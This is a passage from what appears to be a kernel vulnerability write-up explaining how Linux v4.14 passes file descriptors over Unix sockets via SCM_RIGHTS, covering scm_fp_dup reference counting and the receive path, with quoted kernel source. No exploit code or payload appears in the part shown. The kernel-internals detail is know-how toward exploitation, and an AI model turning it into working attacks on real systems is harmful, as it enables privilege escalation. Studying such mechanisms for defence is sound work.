 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c23">#ifdef</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c13">&nbsp;CONFIG_SECURITY_NETWORK</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; u32 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; secid</span><span class="ykcrMYlEiJ-c10">;</span><span class="ykcrMYlEiJ-c0">&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="ykcrMYlEiJ-c23">/* Passed security ID &nbsp; */</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c23">#endif</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c10">};</span></p></td></tr></table>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span>To be more specific, </span><span class="ykcrMYlEiJ-c3">scm_send</span><span>&nbsp;&rarr; </span><span class="ykcrMYlEiJ-c3">__scm_send</span><span>&nbsp;&rarr; </span><span class="ykcrMYlEiJ-c3">scm_fp_copy</span><span>&nbsp;(</span><span class="ykcrMYlEiJ-c9"><a class="ykcrMYlEiJ-c261" href="https://elixir.bootlin.com/linux/v4.14.277/source/net/core/scm.c#L68">scm.c#L68</a></span><span>) reads the file descriptors from the userspace and initializes </span><span class="ykcrMYlEiJ-c3">scm_cookie-&gt;fp</span><span>&nbsp;which can contain </span><span class="ykcrMYlEiJ-c3">SCM_MAX_FD</span><span class="ykcrMYlEiJ-c2">&nbsp;file structures.</span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span>Since the Linux kernel uses the </span><span class="ykcrMYlEiJ-c3">sk_buff</span><span>&nbsp;(also known as socket buffers or </span><span class="ykcrMYlEiJ-c3">skb</span><span>) object to manage all types of socket datagrams, the kernel also needs to invoke the </span><span class="ykcrMYlEiJ-c3">unix_scm_to_skb</span><span>&nbsp;function to link the </span><span class="ykcrMYlEiJ-c3">scm_cookie-&gt;fp</span><span>&nbsp;to a corresponding </span><span class="ykcrMYlEiJ-c3">skb</span><span>&nbsp;object. This occurs in </span><span class="ykcrMYlEiJ-c3">unix_attach_fds</span><span>&nbsp;(</span><span class="ykcrMYlEiJ-c9"><a class="ykcrMYlEiJ-c261" href="https://elixir.bootlin.com/linux/v4.14.277/source/net/unix/scm.c#L103">scm.c#L103</a></span><span class="ykcrMYlEiJ-c2">):</span></p>
 <p class="c31 c20 c29"><span class="ykcrMYlEiJ-c2"></span></p><a id="t.7d908bfdc8aa4cf5bff47e5320fdce7dc7e2949e"></a><a id="t.2"></a><table class="ykcrMYlEiJ-c33"><tr class="ykcrMYlEiJ-c17"><td class="ykcrMYlEiJ-c18" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c10">&hellip;</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c23">/*</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c23">&nbsp;* Need to duplicate file references for the sake of garbage</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c23">&nbsp;* collection. &nbsp;Otherwise a socket in the fps might become a</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c23">&nbsp;* candidate for GC while the skb is not yet queued.</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c23">&nbsp;*/</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">UNIXCB</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">(</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">skb</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">).</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">fp </span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">=</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">&nbsp;scm_fp_dup</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">(</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">scm</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">-&gt;</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">fp</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">);</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c14">if</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c10">(!</span><span class="ykcrMYlEiJ-c0">UNIXCB</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c0">skb</span><span class="ykcrMYlEiJ-c10">).</span><span class="ykcrMYlEiJ-c0">fp</span><span class="ykcrMYlEiJ-c10">)</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c14">return</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c10">-</span><span class="ykcrMYlEiJ-c0">ENOMEM</span><span class="ykcrMYlEiJ-c10">;</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c10">&hellip;</span></p></td></tr></table>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span>The </span><span class="ykcrMYlEiJ-c3">scm_fp_dup</span><span>&nbsp;call in </span><span class="ykcrMYlEiJ-c3">unix_attach_fds</span><span class="ykcrMYlEiJ-c2">&nbsp;increases the reference count of the file descriptor that&rsquo;s being passed so the file is still valid even after the sender closes the transmitted file descriptor later:</span></p>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p><a id="t.48360ede8275e8fd7e6e61cd084a628de58bb15f"></a><a id="t.3"></a><table class="ykcrMYlEiJ-c33"><tr class="ykcrMYlEiJ-c17"><td class="ykcrMYlEiJ-c18" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c14">struct</span><span class="ykcrMYlEiJ-c0">&nbsp;scm_fp_list </span><span class="ykcrMYlEiJ-c10">*</span><span class="ykcrMYlEiJ-c0">scm_fp_dup</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c14">struct</span><span class="ykcrMYlEiJ-c0">&nbsp;scm_fp_list </span><span class="ykcrMYlEiJ-c10">*</span><span class="ykcrMYlEiJ-c0">fpl</span><span class="ykcrMYlEiJ-c10">)</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c10">{</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c14">struct</span><span class="ykcrMYlEiJ-c0">&nbsp;scm_fp_list </span><span class="ykcrMYlEiJ-c10">*</span><span class="ykcrMYlEiJ-c0">new_fpl</span><span class="ykcrMYlEiJ-c10">;</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c14">int</span><span class="ykcrMYlEiJ-c0">&nbsp;i</span><span class="ykcrMYlEiJ-c10">;</span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c29"><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c13"></span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c14">if</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c10">(!</span><span class="ykcrMYlEiJ-c0">fpl</span><span class="ykcrMYlEiJ-c10">)</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c14">return</span><span class="ykcrMYlEiJ-c0">&nbsp;NULL</span><span class="ykcrMYlEiJ-c10">;</span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c29"><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c13"></span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; new_fpl </span><span class="ykcrMYlEiJ-c10">=</span><span class="ykcrMYlEiJ-c0">&nbsp;kmemdup</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c0">fpl</span><span class="ykcrMYlEiJ-c10">,</span><span class="ykcrMYlEiJ-c0">&nbsp;offsetof</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c14">struct</span><span class="ykcrMYlEiJ-c0">&nbsp;scm_fp_list</span><span class="ykcrMYlEiJ-c10">,</span><span class="ykcrMYlEiJ-c0">&nbsp;fp</span><span class="ykcrMYlEiJ-c10">[</span><span class="ykcrMYlEiJ-c0">fpl</span><span class="ykcrMYlEiJ-c10">-&gt;</span><span class="ykcrMYlEiJ-c0">count</span><span class="ykcrMYlEiJ-c10">]),</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; GFP_KERNEL</span><span class="ykcrMYlEiJ-c10">);</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c14">if</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c0">new_fpl</span><span class="ykcrMYlEiJ-c10">)</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c10">{</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c14">for</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c0">i </span><span class="ykcrMYlEiJ-c10">=</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c35">0</span><span class="ykcrMYlEiJ-c10">;</span><span class="ykcrMYlEiJ-c0">&nbsp;i </span><span class="ykcrMYlEiJ-c10">&lt;</span><span class="ykcrMYlEiJ-c0">&nbsp;fpl</span><span class="ykcrMYlEiJ-c10">-&gt;</span><span class="ykcrMYlEiJ-c0">count</span><span class="ykcrMYlEiJ-c10">;</span><span class="ykcrMYlEiJ-c0">&nbsp;i</span><span class="ykcrMYlEiJ-c10">++)</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; get_file</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">(</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">fpl</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">-&gt;</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">fp</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">[</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">i</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">]);</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; new_fpl</span><span class="ykcrMYlEiJ-c10">-&gt;</span><span class="ykcrMYlEiJ-c0">max </span><span class="ykcrMYlEiJ-c10">=</span><span class="ykcrMYlEiJ-c0">&nbsp;new_fpl</span><span class="ykcrMYlEiJ-c10">-&gt;</span><span class="ykcrMYlEiJ-c0">count</span><span class="ykcrMYlEiJ-c10">;</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; new_fpl</span><span class="ykcrMYlEiJ-c10">-&gt;</span><span class="ykcrMYlEiJ-c0">user </span><span class="ykcrMYlEiJ-c10">=</span><span class="ykcrMYlEiJ-c0">&nbsp;get_uid</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c0">fpl</span><span class="ykcrMYlEiJ-c10">-&gt;</span><span class="ykcrMYlEiJ-c0">user</span><span class="ykcrMYlEiJ-c10">);</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c10">}</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c14">return</span><span class="ykcrMYlEiJ-c0">&nbsp;new_fpl</span><span class="ykcrMYlEiJ-c10">;</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c10">}</span></p></td></tr></table>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span>Let&rsquo;s examine a concrete example. Assume we have sockets </span><span class="ykcrMYlEiJ-c8">A</span><span>&nbsp;and </span><span class="ykcrMYlEiJ-c8">B</span><span>. The </span><span class="ykcrMYlEiJ-c8">A</span><span>&nbsp;attempts to pass itself to </span><span class="ykcrMYlEiJ-c8">B</span><span>. After the </span><span class="ykcrMYlEiJ-c3">SCM_RIGHTS</span><span>&nbsp;datagram is sent, the newly allocated </span><span class="ykcrMYlEiJ-c3">skb</span><span>&nbsp;from the sender will be appended to the </span><span class="ykcrMYlEiJ-c8">B</span><span>&rsquo;s </span><span class="ykcrMYlEiJ-c3">sk_receive_queue</span><span class="ykcrMYlEiJ-c2">&nbsp;which stores received datagrams:</span></p>
 <p class="ykcrMYlEiJ-c31 ykcrMYlEiJ-c20"></p>
 <p class="ykcrMYlEiJ-c31 ykcrMYlEiJ-c20"><span class="ykcrMYlEiJ-c2"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgNWAkA0RVb4goO21_FhJOVV-LSNTfbXV7GKoqH-CUrdMTpDcNUSQxEssrnAVGxC50aK-Z3HfIWeDyCgkr6lb5-a1Ha9Km5ppaHeBzWmLj8NTmZtUjx8J-VzzM1O7mYdjOfw2ErddrslDXw6rDZrs0g1DEC1Ya4VAbkLKKEhZgNPeiSefH-xpv3zDa8/s1438/image71.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgNWAkA0RVb4goO21_FhJOVV-LSNTfbXV7GKoqH-CUrdMTpDcNUSQxEssrnAVGxC50aK-Z3HfIWeDyCgkr6lb5-a1Ha9Km5ppaHeBzWmLj8NTmZtUjx8J-VzzM1O7mYdjOfw2ErddrslDXw6rDZrs0g1DEC1Ya4VAbkLKKEhZgNPeiSefH-xpv3zDa8/s1200/image71.png" border="0" alt="unix_stream_sendmsg creates sk_buff which contains the structure scm_fp_list. The scm_fp_list has a fp pointer points to the transmitted file (A). The sk_buff is appended to the receiver queue and the reference count of A is 2." style="max-height: 750px; max-width: 600px;"title="unix_stream_sendmsg creates sk_buff which contains the structure scm_fp_list. The scm_fp_list has a fp pointer points to the transmitted file (A). The sk_buff is appended to the receiver queue and the reference count of A is 2." /></a></span></p>
 <p class="ykcrMYlEiJ-c31 ykcrMYlEiJ-c20"><span class="ykcrMYlEiJ-c3">sk_buff</span><span>&nbsp;carries </span><span class="ykcrMYlEiJ-c3">scm_fp_list</span><span class="ykcrMYlEiJ-c2">&nbsp;structure</span></p>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span>The reference count of </span><span class="ykcrMYlEiJ-c8">A</span><span>&nbsp;is incremented to 2 and the reference count of </span><span class="ykcrMYlEiJ-c8">B</span><span class="ykcrMYlEiJ-c2">&nbsp;is still 1.</span></p>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p><h2 class="ykcrMYlEiJ-c30 ykcrMYlEiJ-c20" id="h.b16dgtqtkmv1"><span class="ykcrMYlEiJ-c1">Receiving</span></h2>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span>Now, let&rsquo;s take a look at the receiver side </span><span class="ykcrMYlEiJ-c3">unix_stream_read_generic</span><span>&nbsp;(we will not discuss the </span><span class="ykcrMYlEiJ-c3">MSG_PEEK</span><span>&nbsp;flag yet, and focus on the normal </span><span class="ykcrMYlEiJ-c9"><a class="ykcrMYlEiJ-c261" href="https://elixir.bootlin.com/linux/v4.14.277/source/net/unix/af_unix.c#L2445">routine</a></span><span>). First of all, the kernel grabs the current </span><span class="ykcrMYlEiJ-c3">skb</span><span>&nbsp;from </span><span class="ykcrMYlEiJ-c3">sk_receive_queue</span><span>&nbsp;using </span><span class="ykcrMYlEiJ-c3">skb_peek</span><span>. Secondly, since </span><span class="ykcrMYlEiJ-c3">scm_fp_list</span><span>&nbsp;is attached to the </span><span class="ykcrMYlEiJ-c3">skb</span><span>, the kernel will call </span><span class="ykcrMYlEiJ-c3">unix_detach_fds</span><span>&nbsp;(</span><span class="ykcrMYlEiJ-c9"><a class="ykcrMYlEiJ-c261" href="https://elixir.bootlin.com/linux/v4.14.277/source/net/unix/scm.c#L125">link</a></span><span>) </span><span>to parse the transmitted file structures from </span><span class="ykcrMYlEiJ-c3">skb</span><span>&nbsp;and clear the </span><span class="ykcrMYlEiJ-c3">skb</span><span>&nbsp;from </span><span class="ykcrMYlEiJ-c3">sk_receive_queue</span><span>:</span></p>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p><a id="t.d7b1cde66ffafc113438777cb255432b8ed4e0e4"></a><a id="t.4"></a><table class="ykcrMYlEiJ-c33"><tr class="ykcrMYlEiJ-c17"><td class="ykcrMYlEiJ-c18" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c23">/* Mark read part of skb as used */</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c14">if</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c10">(!(</span><span class="ykcrMYlEiJ-c0">flags </span><span class="ykcrMYlEiJ-c10">&amp;</span><span class="ykcrMYlEiJ-c0">&nbsp;MSG_PEEK</span><span class="ykcrMYlEiJ-c10">))</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c10">{</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c0">UNIXCB</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c0">skb</span><span class="ykcrMYlEiJ-c10">).</span><span class="ykcrMYlEiJ-c0">consumed </span><span class="ykcrMYlEiJ-c10">+=</span><span class="ykcrMYlEiJ-c0">&nbsp;chunk</span><span class="ykcrMYlEiJ-c10">;</span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c29"><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c13"></span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; sk_peek_offset_bwd</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c0">sk</span><span class="ykcrMYlEiJ-c10">,</span><span class="ykcrMYlEiJ-c0">&nbsp;chunk</span><span class="ykcrMYlEiJ-c10">);</span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c29"><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c13"></span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c14 ykcrMYlEiJ-c7">if</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">&nbsp;</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">(</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">UNIXCB</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">(</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">skb</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">).</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">fp</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">)</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; unix_detach_fds</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">(&amp;</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">scm</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">,</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c7">&nbsp;skb</span><span class="ykcrMYlEiJ-c10 ykcrMYlEiJ-c7">);</span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c29"><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c13"></span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c14">if</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c0">unix_skb_len</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c0">skb</span><span class="ykcrMYlEiJ-c10">))</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c14">break</span><span class="ykcrMYlEiJ-c10">;</span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c29"><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c13"></span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; skb_unlink</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c0">skb</span><span class="ykcrMYlEiJ-c10">,</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c10">&amp;</span><span class="ykcrMYlEiJ-c0">sk</span><span class="ykcrMYlEiJ-c10">-&gt;</span><span class="ykcrMYlEiJ-c0">sk_receive_queue</span><span class="ykcrMYlEiJ-c10">);</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; consume_skb</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c0">skb</span><span class="ykcrMYlEiJ-c10">);</span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c29"><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c13"></span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c14">if</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c0">scm</span><span class="ykcrMYlEiJ-c10">.</span><span class="ykcrMYlEiJ-c0">fp</span><span class="ykcrMYlEiJ-c10">)</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c14">break</span><span class="ykcrMYlEiJ-c10">;</span></p></td></tr></table>
 <p class="ykcrMYlEiJ-c5"><span class="ykcrMYlEiJ-c2"></span></p>
 <p class="ykcrMYlEiJ-c12 ykcrMYlEiJ-c20"><span>The function </span><span class="ykcrMYlEiJ-c3">scm_detach_fds</span><span>&nbsp;iterates over the list of passed file descriptors (</span><span class="ykcrMYlEiJ-c3">scm-&gt;fp)</span><span>&nbsp;</span><span class="ykcrMYlEiJ-c2">and installs the new file descriptors accordingly for the receiver:</span></p><a id="t.cccd27f0609fb1b03a888ddc1137e5fe1004a78a"></a><a id="t.5"></a><table class="ykcrMYlEiJ-c33"><tr class="ykcrMYlEiJ-c17"><td class="ykcrMYlEiJ-c18" colspan="1" rowspan="1">
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c14">for</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c0">i</span><span class="ykcrMYlEiJ-c10">=</span><span class="ykcrMYlEiJ-c35">0</span><span class="ykcrMYlEiJ-c10">,</span><span class="ykcrMYlEiJ-c0">&nbsp;cmfptr</span><span class="ykcrMYlEiJ-c10">=(</span><span class="ykcrMYlEiJ-c0">__force </span><span class="ykcrMYlEiJ-c14">int</span><span class="ykcrMYlEiJ-c0">&nbsp;__user </span><span class="ykcrMYlEiJ-c10">*)</span><span class="ykcrMYlEiJ-c0">CMSG_DATA</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c0">cm</span><span class="ykcrMYlEiJ-c10">);</span><span class="ykcrMYlEiJ-c0">&nbsp;i</span><span class="ykcrMYlEiJ-c10">&lt;</span><span class="ykcrMYlEiJ-c0">fdmax</span><span class="ykcrMYlEiJ-c10">;</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp;i</span><span class="ykcrMYlEiJ-c10">++,</span><span class="ykcrMYlEiJ-c0">&nbsp;cmfptr</span><span class="ykcrMYlEiJ-c10">++)</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c10">{</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c14">struct</span><span class="ykcrMYlEiJ-c0">&nbsp;socket </span><span class="ykcrMYlEiJ-c10">*</span><span class="ykcrMYlEiJ-c0">sock</span><span class="ykcrMYlEiJ-c10">;</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c14">int</span><span class="ykcrMYlEiJ-c0">&nbsp;new_fd</span><span class="ykcrMYlEiJ-c10">;</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; err </span><span class="ykcrMYlEiJ-c10">=</span><span class="ykcrMYlEiJ-c0">&nbsp;security_file_receive</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c0">fp</span><span class="ykcrMYlEiJ-c10">[</span><span class="ykcrMYlEiJ-c0">i</span><span class="ykcrMYlEiJ-c10">]);</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c14">if</span><span class="ykcrMYlEiJ-c0">&nbsp;</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c0">err</span><span class="ykcrMYlEiJ-c10">)</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="ykcrMYlEiJ-c14">break</span><span class="ykcrMYlEiJ-c10">;</span></p>
 <p class="ykcrMYlEiJ-c12"><span class="ykcrMYlEiJ-c0">&nbsp; &nbsp; &nbsp; &nbsp; err </span><span class="ykcrMYlEiJ-c10">=</span><span class="ykcrMYlEiJ-c0">&nbsp;get_unused_fd_flags</span><span class="ykcrMYlEiJ-c10">(</span><span class="ykcrMYlEiJ-c0">MSG_CMSG_CLOEXEC </span><span class="ykcrMYlEiJ-c10">&amp;</span><span class="ykcrMYlEiJ-c0">&nbsp;msg</span><span class="ykcrMYlEiJ-c10">-&gt;</span><span class="ykcrMYlEiJ-c0 ykcrMYlEiJ-c13">msg_flags</span></p>
